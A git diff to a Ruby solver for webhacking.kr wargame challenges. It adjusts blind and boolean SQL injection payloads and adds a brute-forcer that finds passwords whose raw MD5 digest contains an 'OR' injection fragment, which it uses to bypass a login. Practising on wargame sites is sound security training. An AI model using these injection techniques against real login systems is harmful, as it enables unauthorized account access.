@@ -4,6 +4,7 @@ require 'digest'
 require 'base64'
 require 'resolv'
 require 'docx'
+require 'securerandom'
 
 module WebhackingKR
   ##
@@ -828,7 +829,7 @@ module WebhackingKR
           payload = PAYLOAD.dup
           c = char.sub('_', '\\_')
           payload.sub!('$LOGIN$', LOGIN.unpack1('H*'))
-          payload.sub!('$PASSWORD$', "#{password}#{char}%".unpack1('H*'))
+          payload.sub!('$PASSWORD$', "#{password}#{c}%".unpack1('H*'))
           query = URI.encode_www_form(
             PARAM_NO => payload,
             PARAM_ID => 'guest',
@@ -938,13 +939,62 @@ module WebhackingKR
     PATH = '/challenge/web-24/'
     PARAM_LV = 'lv'
     LOGIN = 'admin'
-    PAYLOAD = "0||`id`=0x$HEX$"
+    PAYLOAD = '0||`id`=0x$HEX$'
 
     def exec
       payload = PAYLOAD.sub('$HEX$', LOGIN.unpack1('H*'))
       query = URI.encode_www_form(PARAM_LV => payload)
       log('Sending payload')
       response = get("#{PATH}?#{query}")
+      check(response.body)
+    end
+  end
+
+  ##
+  # Challenge 51
+  class Challenge51 < ChallengeBase
+    CHALLENGE = 51
+
+    PATH = '/challenge/bonus-13/'
+    PARAM_ID = 'id'
+    PARAM_PW = 'pw'
+    RANDOM_MAX = 6
+    PAYLOAD = "'OR'"
+
+    def exec
+      log('Searching MD5 hash')
+      password = nil
+      hash = nil
+      i = s = 0
+      seed = SecureRandom.alphanumeric(RANDOM_MAX)
+      time = Time.now
+      loop do
+        password = "#{seed}#{s}"
+        hash = Digest::MD5.digest(password.to_s)
+        i += 1
+        if Time.now - time >= 1
+          time = Time.now
+          log("#{i}/sec") if (time.to_i % 60).zero?
+          i = 0
+        end
+
+        break if hash.include?(PAYLOAD) && hash =~ /^[^']*#{PAYLOAD}[1-9][^']*$/
+
+        s += 1
+      end
+
+      log("Hash found: #{hash.unpack1('H*')}")
+      log("Password: #{password}")
+      log('Logging in')
+      @wargame.login
+      log('Sending password')
+      response = post(
+        PATH,
+        {
+          PARAM_ID => 'id',
+          PARAM_PW => password
+        }
+      )
       check(response.body)
     end
   end
